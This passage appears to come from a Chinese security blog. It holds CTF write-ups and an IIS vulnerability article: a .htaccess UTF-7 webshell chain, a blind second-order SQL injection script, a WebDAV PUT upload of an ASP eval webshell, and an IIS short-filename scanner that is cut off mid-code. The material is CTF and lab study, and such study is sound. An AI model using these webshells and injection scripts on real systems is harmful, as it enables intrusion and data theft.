class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">"\nJust one chance"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码逻辑：先删除当前目录下除index.php外的所有文件，然后包含fl3g.php，如果存在content和filename，就将content拼接后写入filename</p>
+<p>尝试写一个一句话木马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?content=<span class="meta">&lt;?php</span>%<span class="number">20</span><span class="keyword">eval</span>($_POST[a]);<span class="meta">?&gt;</span>&amp;filename=shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/buu-web-7/1593738690408.png" alt="1593738690408"></p>
+<p>可以看到php代码并没有解析，可以通过直接写入<code>.htaccess</code>文件来 get flag。</p>
+<blockquote>
+<ul>
+<li>每次都会<code>unlink</code>删除当前所有除index.php 外的文件</li>
+<li>有 on / html / type / flag / upload / file 关键字大小写过滤</li>
+<li>文件自动包含<code>fl3g.php</code>，但是文件名有<code>/[^a-z\.]/</code>正则限制</li>
+<li>最后还会有<code>\n</code>换行追加数据导致<code>.htaccess</code>解析错误的限制</li>
+</ul>
+</blockquote>
+<p>在<code>.htaccess</code>当中可以使用几种类型格式来更改 php 配置</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value name value</span><br><span class="line"></span><br><span class="line">php_flag name on|off</span><br><span class="line"></span><br><span class="line">php_admin_value name value</span><br><span class="line"></span><br><span class="line">php_admin_flag name on|off</span><br></pre></td></tr></table></figure>
+
+<p><code>flag</code>被作为关键字过滤了，但是无论是<code>php_flag</code>还是<code>php_amdin_flag</code>只是<code>php_value</code>的简化，能通过<code>php_flag</code>设置的参数我们大部分还是都可以用<code>php_value</code>去设置</p>
+<p><strong>error_log</strong></p>
+<p><em><code>error_log</code>可以把<code>error_reporting</code>设置的错误等级写入到设置的文件当中，这个看起来我们可以利用该函数来就进行报错写入文件，但是对于一开始就删除当前文件夹下所有文件的操作，即使我们可以写入自定义内容，也会被删除。所以我们可能还需要找另外一条路径使得该文件可以保存下来</em></p>
+<p> <strong>include_path</strong></p>
+<p> include_path可以指定<code>include</code>等包含函数包含的环境路径，而题目代码使用的是<code>scandir(&#39;./&#39;);</code>作为获取当前文件的操作，只是删除当前文件，而<code>error_log</code>又可以指定路径。所以我们大概可以有这么个思路：</p>
+<ul>
+<li>使用<code>error_log</code>指定一个非当前文件路径的可写路径，例如<code>/tmp/fl3g.php</code></li>
+<li>利用<code>include_path</code>指定包含的环境路径为<code>/tmp</code></li>
+<li>这样<code>include</code>包含的时候，就是包含到了<code>/tmp/fl3g.php</code></li>
+</ul>
+<p>这样就可以绕过删除当前文件夹下所有文件的操作了。</p>
+<p>本地试试一下，在当前目录下一个.htaccess文件，内容为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value error_log /tmp/fl3g.php</span><br><span class="line">php_value include_path /tmp</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>index.php</code>，报错<br><img src="/2020/07/14/buu-web-7/1593741542689.png" alt="1593741542689"></p>
+<p>发现报错当中存在我们写入.htaccess文件当中的路径，尝试修改路径为恶意代码达到getshell的目的</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value error_log /tmp/fl3g.php</span><br><span class="line">php_value include_path <span class="string">'/tmp&lt;?php phpinfo();?&gt;'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/buu-web-7/1593741776137.png" alt="1593741776137"></p>
+<p>但是尖括号被html编码了，这里可以先用 UTF-7 编码写入，再利用<code>.htaccess</code>解码 UTF-7<br>先尝试利用 UTF-7 编码我们需要插入的恶意代码，写入<code>.htaccess</code>的文件内容如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value include_path <span class="string">"D:/phpstudy_pro/wamp64/tmp/xx/+ADw?php phpinfo()+ADs?+AD4-"</span></span><br><span class="line">php_value error_reporting <span class="number">32767</span></span><br><span class="line">php_value error_log D:/phpstudy_pro/wamp64/tmp/fl3g.php</span><br><span class="line"><span class="comment"># \</span></span><br></pre></td></tr></table></figure>
+
+<p>访问index.php报错将日志写入D:/phpstudy_pro/wamp64/tmp/fl3g.php中</p>
+<p>之后写入.htaccess新的配置</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value zend.multibyte <span class="number">1</span></span><br><span class="line">php_value zend.script_encoding <span class="string">"UTF-7"</span></span><br><span class="line">php_value include_path <span class="string">"D:/phpstudy_pro/wamp64/tmp/"</span></span><br><span class="line">php_value error_log D:/phpstudy_pro/wamp64/tmp/fl3g.php</span><br><span class="line"><span class="comment"># \</span></span><br></pre></td></tr></table></figure>
+
+<p>访问index.php成功执行恶意代码<br><img src="/2020/07/14/buu-web-7/1593744129319.png" alt="1593744129319"></p>
+<p>该题中最后的<code>\nJust one chance</code>影响到了<code>.htaccess</code>文件解析，所以需要利用<code>#</code>注释符将整句话都注视掉，但是又由于有<code>\n</code>换行符的存在，我们不能直接使用<code>#</code>就将其注释掉，需要使用<code>\</code>将其注释掉</p>
+<p><strong>解题</strong></p>
+<p>通过python进行文件写入</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">PAYLOAD1 = <span class="string">"""php_value error_log /tmp/fl3g.php</span></span><br><span class="line"><span class="string">php_value error_reporting 32767</span></span><br><span class="line"><span class="string">php_value include_path "+ADw?php eval($_GET[1]);+ADs?+AD4-"</span></span><br><span class="line"><span class="string"># \\"""</span></span><br><span class="line"></span><br><span class="line">PAYLOAD2 = <span class="string">"""php_value zend.multibyte 1</span></span><br><span class="line"><span class="string">php_value zend.script_encoding "UTF-7"</span></span><br><span class="line"><span class="string">php_value include_path "/tmp/"</span></span><br><span class="line"><span class="string">php_value error_log /tmp/fl3g.php</span></span><br><span class="line"><span class="string"># \\"""</span></span><br><span class="line"></span><br><span class="line">URL = <span class="string">"http://e896c0f0-53d0-4352-948f-cf21ad0f1d79.node3.buuoj.cn/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_content</span><span class="params">(name, content)</span>:</span></span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"content"</span> : content,</span><br><span class="line">        <span class="string">"filename"</span> : name,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> requests.get(URL, params=data)</span><br><span class="line"></span><br><span class="line">rep = upload_content(<span class="string">".htaccess"</span>, PAYLOAD1)</span><br><span class="line">print(rep.text)</span><br><span class="line"></span><br><span class="line">rep = upload_content(<span class="string">".htaccess"</span>, PAYLOAD2)</span><br><span class="line">print(rep.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/buu-web-7/1593746297567.png" alt="1593746297567"></p>
+<p>参考文章：<a href="http://blog.zeddyu.info/2019/10/03/xnuca-2019-ezphp" target="_blank" rel="noopener">http://blog.zeddyu.info/2019/10/03/xnuca-2019-ezphp</a></p>
+<h1 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h1><p>题目为一个登陆界面，通过扫描目录发现了register.php，注册后登陆</p>
+<p><img src="/2020/07/14/buu-web-7/1593768264872.png" alt="1593768264872"></p>
+<p>但是没有一个功能点，所以应该从注册和登陆界面入手，猜测存在二次注入</p>
+<p>注入点在注册页面的username处<br>当注册失败的时候返回200，成功则返回302<br>1.出现黑名单字符，返回 nnnnoooo!!!<br>2.语句不正确，返回200<br>3.语句正确，返回302跳转至login.php</p>
+<p><img src="/2020/07/14/buu-web-7/1593771663000.png" alt="1593771663000"></p>
+<p>fuzz一下过滤的字符</p>
+<p><img src="/2020/07/14/buu-web-7/1593771798376.png" alt="1593771798376"></p>
+<p>这里需要使用异或注入，构造payload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">email=<span class="number">1111</span>@<span class="number">666.</span>com&amp;username=<span class="number">0</span><span class="string">'%2B(select hex(hex(database())))%2B'</span><span class="number">0</span>&amp;password=<span class="number">1111</span></span><br></pre></td></tr></table></figure>
+
+<p>登陆得到用户名<br><img src="/2020/07/14/buu-web-7/1593772232768.png" alt="1593772232768"></p>
+<p>两次hex解码后得到数据库名为web</p>
+<blockquote>
+<p>至于为什么 <strong>payload</strong> 要进行两次 <strong>hex</strong> 加密，看下面这张图就明白了。</p>
+<p><a href="https://mochazz.github.io/img/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA/10.png" target="_blank" rel="noopener"><img src="/2020/07/14/buu-web-7/10.png" alt="10"></a></p>
+<p>然后这里还要注意一个问题，就是当数据进过 <strong>两次hex</strong> 后，会得到较长的一串只含有数字的字符串，当这个长字符串转成数字型数据的时候会变成科学计数法，也就是说会丢失数据精度，如下：</p>
+<p><a href="https://mochazz.github.io/img/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA/11.png" target="_blank" rel="noopener"><img src="/2020/07/14/buu-web-7/11.png" alt="11"></a></p>
+<p>所以这里我们使用 <strong>substr</strong> 每次取10个字符长度与 <strong>‘0’</strong> 相加，这样就不会丢失数据。但是这里使用逗号 <strong>,</strong> 会出错，所以可以使用类似 <strong>substr(‘test’ from 1 for 10)</strong> 这种写法来绕过，具体获取 <strong>flag</strong> 的payload如下：</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>'%<span class="number">2</span><span class="constructor">B(<span class="params">select</span> <span class="params">substr</span>(<span class="params">hex</span>(<span class="params">hex</span>((<span class="params">select</span> <span class="operator">*</span> <span class="params">from</span> <span class="params">flag</span>)</span>)) from <span class="number">1</span> for <span class="number">10</span>))%<span class="number">2</span>B'<span class="number">0</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>大佬的脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">URL = <span class="string">'http://89318901-1078-4124-9b4d-7ca578f8039b.node3.buuoj.cn/'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(email)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"email"</span>: email,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = req.post(URL + <span class="string">'/login.php'</span>, data)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'1          &lt;/span&gt;'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(u, e)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span>: u,</span><br><span class="line">        <span class="string">"email"</span>: e,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = req.post(URL + <span class="string">'/register.php'</span>, data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">302</span>:</span><br><span class="line">        <span class="keyword">return</span> login(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">table = <span class="string">'qwertyuiopasdfghjklzxcvbnm'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">(pl)</span>:</span></span><br><span class="line">    email = <span class="string">''</span>.join(random.sample(table, <span class="number">8</span>)) + <span class="string">'@qq.com'</span></span><br><span class="line">    <span class="keyword">return</span> reg(pl, email)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLen</span><span class="params">(sql)</span>:</span></span><br><span class="line">    print(<span class="string">"[+] Starting getLen..."</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">        sys.stdout.write(<span class="string">"[+] Len : -&gt; %d &lt;-\r"</span> % i)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        <span class="keyword">if</span> b(<span class="string">"1'and((select length((%s)))=%d)and'1"</span> % (sql, i)):</span><br><span class="line">            print(<span class="string">"[+] Len : -&gt; %d &lt;-"</span> % i)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(sql=<span class="string">"version()"</span>)</span>:</span></span><br><span class="line">    _len = getLen(sql)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> _len:</span><br><span class="line">        print(<span class="string">"[-] getLen 'Error'"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    print(<span class="string">"[+] Starting getData..."</span>)</span><br><span class="line">    table = <span class="string">'&#125;&#123;1234567890.-@_qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">1</span>, _len + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> table:</span><br><span class="line">            sys.stdout.write(<span class="string">"[+] Result : -&gt; %s%c &lt;-\r"</span> % (res, ch))</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            pl = <span class="string">"1'and((select substr((%s)from(%d)for(1))='%s'))and'1"</span> % (</span><br><span class="line">                sql, pos, ch)</span><br><span class="line">            <span class="keyword">if</span> b(pl):</span><br><span class="line">                res += ch</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"[+] Result : -&gt; %s &lt;- "</span> % res)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># right(left(x,pos),1)</span></span><br><span class="line"><span class="comment"># mid(x,pos,1)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># pl = "(select substr((version())from(1)for(1))='%s')" % '5'</span></span><br><span class="line">    <span class="comment"># pl = "1'and(%s)and'1" % pl</span></span><br><span class="line">    <span class="comment"># print(b(pl))</span></span><br><span class="line">    pl = <span class="string">'version()'</span></span><br><span class="line">    pl = <span class="string">'select t.c from (select (select 1)c union select * from flag)t limit 1 offset 1'</span></span><br><span class="line">    getData(pl)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/buu-web-7/1593775347092.png" alt="1593775347092"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">参考文章：https:<span class="comment">//mochazz.github.io/2018/08/23/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BAWeb%E9%A2%98%E8%A7%A3/#unfinished</span></span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>IIS中间件漏洞总结</title>
+    <url>/2020/07/14/iiszhong-jian-jian/</url>
+    <content><![CDATA[<h1 id="IIS简介"><a href="#IIS简介" class="headerlink" title="IIS简介"></a>IIS简介</h1><p>IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。最初是Windows NT版本的可选包，随后内置在Windows 2000、Windows XP Professional和Windows Server 2003一起发行，但在Windows XP Home版本上并没有IIS。<a id="more"></a></p>
+<p>IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。 </p>
+<p>IIS的安全脆弱性曾长时间被业内诟病，一旦IIS出现远程执行漏洞威胁将会非常严重。远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码，可以导致IIS服务器所在机器蓝屏或读取其内存中的机密数据。</p>
+<p>IIS 6.0：可解析后缀：.asa .cer .cdx .asp等脚本文件</p>
+<h1 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h1><h2 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a><strong>漏洞产生原因</strong></h2><p> WEB服务器扩展里设置WebDAV为允许；网站权限配置开启了写入权限与脚本资源访问权限。</p>
+<p><code>WebDAV(Web-based Distributed Authoring and Versioning)一种基于HTTP1.1协议的通信协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。</code></p>
+<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a><strong>漏洞危害</strong></h2><p>任意文件上传</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h2><p>实验环境使用windows server2003+iis6.0<br>环境下载链接：<a href="https://pan.baidu.com/s/1KOO7MkwIDpWAqbMMNSddzg" target="_blank" rel="noopener">https://pan.baidu.com/s/1KOO7MkwIDpWAqbMMNSddzg</a> 提取码：5sia<br>开机密码123456</p>
+<p>该靶机环境已经配置好了，其中WebDAV已经开启<br><img src="/2020/07/14/iiszhong-jian-jian/1594541644418.png" alt="1594541644418"></p>
+<p>该靶机ip为192.168.102.62</p>
+<p><img src="/2020/07/14/iiszhong-jian-jian/1594541678355.png" alt="1594541678355"></p>
+<p>使用nikto扫描一下该网址</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nikto -h http:<span class="comment">//192.168.102.62</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/iiszhong-jian-jian/1594541797109.png" alt="1594541797109"></p>
+<p>该服务器支持PUT请求，并且允许客户端将文件保存在Web服务器上<br>通过burp进行抓包，将GET请求改为PUT，并且后面接上写入文件的名字，数据包最下面为写入文件的内容</p>
+<p><img src="/2020/07/14/iiszhong-jian-jian/1594542275421.png" alt="1594542275421"></p>
+<p>写入成功<br><img src="/2020/07/14/iiszhong-jian-jian/1594542300535.png" alt="1594542300535"></p>
+<p>写入一句话木马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="keyword">eval</span> request(<span class="string">"chopper"</span>)%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/14/iiszhong-jian-jian/1594544702817.png" alt="1594544702817"></p>
+<p>使用MOVE或者COPY请求将其改为asp文件</p>
+<p><img src="/2020/07/14/iiszhong-jian-jian/1594544803770.png" alt="1594544803770"></p>
+<p><img src="/2020/07/14/iiszhong-jian-jian/1594544836720.png" alt="1594544836720"></p>
+<p>蚁剑连接即可获得shell</p>
+<p><img src="/2020/07/14/iiszhong-jian-jian/1594544991726.png" alt="1594544991726"></p>
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a><strong>修复方案</strong></h2><blockquote>
+<p>关闭WebDAV服务<br>使用相关的防护设备</p>
+</blockquote>
+<h1 id="短文件名猜解漏洞"><a href="#短文件名猜解漏洞" class="headerlink" title="短文件名猜解漏洞"></a>短文件名猜解漏洞</h1><h2 id="漏洞产生原因-1"><a href="#漏洞产生原因-1" class="headerlink" title="漏洞产生原因"></a><strong>漏洞产生原因</strong></h2><p>为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短 文件名，而生成的短文件名符合一定的规律，可以被暴力猜解。 </p>
+<h2 id="漏洞危害-1"><a href="#漏洞危害-1" class="headerlink" title="漏洞危害"></a><strong>漏洞危害</strong></h2><ul>
+<li><p>猜解后台地址 </p>
+</li>
+<li><p>猜解敏感文件，例如备份的rar、zip、.bak、.SQL文件等，在某些情形下，甚至可以通过短文件名web直接下 载对应的文件。比如下载备份SQL文件。 </p>
+</li>
+</ul>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h2><p>这里需要用到通配符，在windows中，可以匹配n个字符，n可以为0。判断某站点是否存在IIS短文件名暴力破解漏 洞，可以分别访问如下两个URL: </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost/*~1*/a.aspx </span><br><span class="line"></span><br><span class="line">http://localhost/cyzcc*~1*/a.aspx</span><br></pre></td></tr></table></figure>
+
+<p>短文件名特征：<br>只显示前<code>6</code>位的字符,后续字符用<code>~1</code>代替。其中数字<code>1</code>可以递增。如果存在文件名类似的文件,则前面的<code>6</code>个字符是相同的,后面的数字进行递增</p>
+<p>如果访问第一个URL，返回404。而访问第二个URL，返回400。 则目标站点存在漏洞</p>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h2><p>复现需要添加组件APS.NET，方法如下：</p>
+<ul>
+<li>在运行 Windows Server 2003 的服务器中使用”添加或删除程序”安装 ASP.NET<br>  　　<br>  1）从”开始”菜单中，指向”控制面板”，然后单击”添加或删除程序”。<pre><code>　　2）在&quot;添加或删除程序&quot;对话框中，单击&quot;添加/删除 Windows 组件&quot;。
+　　3）在&quot;Windows 组件&quot;向导中的&quot;组件&quot;中，选中&quot;应用程序服务器&quot;复选框，然后单击&quot;下一步&quot;。
+　　4）当在&quot;Windows 组件&quot;向导中完成对 Windows Server 2003 的配置时，单击&quot;完成&quot;。</code></pre></li>
+</ul>
+<p><img src="/2020/07/14/iiszhong-jian-jian/1594633978039.png" alt="1594633978039"></p>
+<p>配置好之后我们可以使用命令<code>dir /x</code>来确定漏洞存在。如过存在短文件名，则确定漏洞存在</p>
+<p><img src="/2020/07/14/iiszhong-jian-jian/1594549873941.png" alt="1594549873941"></p>
+<p>先在网站根目录下创建几个长文件名<br><img src="/2020/07/14/iiszhong-jian-jian/1594634713197.png" alt="1594634713197"></p>
+<p>当访问一个存在的文件名时，浏览器返回404</p>
+<p><img src="/2020/07/14/iiszhong-jian-jian/1594634847699.png" alt="1594634847699"></p>
+<p>当访问一个不存在的文件名时，浏览器返回400<br><img src="/2020/07/14/iiszhong-jian-jian/1594634900796.png" alt="1594634900796"></p>
+<h2 id="自动化扫描"><a href="#自动化扫描" class="headerlink" title="自动化扫描"></a><strong>自动化扫描</strong></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line"><span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scanner</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, target)</span>:</span></span><br><span class="line">        self.target = target.lower()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.target.startswith(<span class="string">'http'</span>):</span><br><span class="line">            self.target = <span class="string">'http://%s'</span> % self.target</span><br><span class="line">        self.scheme, self.netloc, self.path, params, query, fragment = \</span><br><span class="line">                     urlparse.urlparse(target)</span><br><span class="line">        <span class="keyword">if</span> self.path[<span class="number">-1</span>:] != <span class="string">'/'</span>:    <span class="comment"># ends with slash</span></span><br><span class="line">            self.path += <span class="string">'/'</span></span><br><span class="line">        self.alphanum = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789_-'</span></span><br><span class="line">        self.files = []</span><br><span class="line">        self.dirs = []</span><br><span class="line">        self.queue = Queue.Queue()</span><br><span class="line">        self.lock = threading.Lock()</span><br><span class="line">        self.threads = []</span><br><span class="line">        self.request_method = <span class="string">''</span></span><br><span class="line">        self.msg_queue = Queue.Queue()</span><br><span class="line">        self.STOP_ME = <span class="literal">False</span></span><br><span class="line">        threading.Thread(target=self._print).start()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_conn</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.scheme == <span class="string">'https'</span>:</span><br><span class="line">                conn = httplib.HTTPSConnection(self.netloc)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                conn = httplib.HTTPConnection(self.netloc)</span><br><span class="line">            <span class="keyword">return</span> conn</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[_conn.Exception]'</span>, e</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_status</span><span class="params">(self, path)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = self._conn()</span><br><span class="line">            conn.request(self.request_method, path)</span><br><span class="line">            status = conn.getresponse().status</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">return</span> status</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'[_get_status.Exception] %s'</span> % str(e) )</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_vul</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> _method <span class="keyword">in</span> [<span class="string">'GET'</span>, <span class="string">'OPTIONS'</span>]:</span><br><span class="line">                self.request_method = _method</span><br><span class="line">                status_1 = self._get_status(self.path + <span class="string">'/*~1*/a.aspx'</span>)    <span class="comment"># an existed file/folder</span></span><br><span class="line">                status_2 = self._get_status(self.path + <span class="string">'/l1j1e*~1*/a.aspx'</span>)    <span class="comment"># not existed file/folder</span></span><br><span class="line">                <span class="keyword">if</span> status_1 == <span class="number">404</span> <span class="keyword">and</span> status_2 != <span class="number">404</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span>  <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'[is_vul.Exception] %s'</span> % str(e) )</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> self.alphanum:</span><br><span class="line">            self.queue.put( (self.path + c, <span class="string">'.*'</span>) )    <span class="comment"># filename, extension</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">            t = threading.Thread(target=self._scan_worker)</span><br><span class="line">            self.threads.append(t)</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> self.threads:</span><br><span class="line">            t.join()</span><br><span class="line">        self.STOP_ME = <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">report</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'-'</span>* <span class="number">64</span></span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> self.dirs:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Dir:  %s'</span> % d</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> self.files:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'File: %s'</span> % f</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'-'</span>*<span class="number">64</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'%d Directories, %d Files found in total'</span> % (len(self.dirs), len(self.files))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Note that * is a wildcard, matches any character zero or more times.'</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_print</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.STOP_ME <span class="keyword">or</span> (<span class="keyword">not</span> self.msg_queue.empty()):</span><br><span class="line">            <span class="keyword">if</span> self.msg_queue.empty():</span><br><span class="line">                time.sleep(<span class="number">0.05</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> self.msg_queue.get()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_scan_worker</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                url, ext = self.queue.get(timeout=<span class="number">1.0</span>)</span><br><span class="line">                status = self._get_status(url + <span class="string">'*~1'</span> + ext + <span 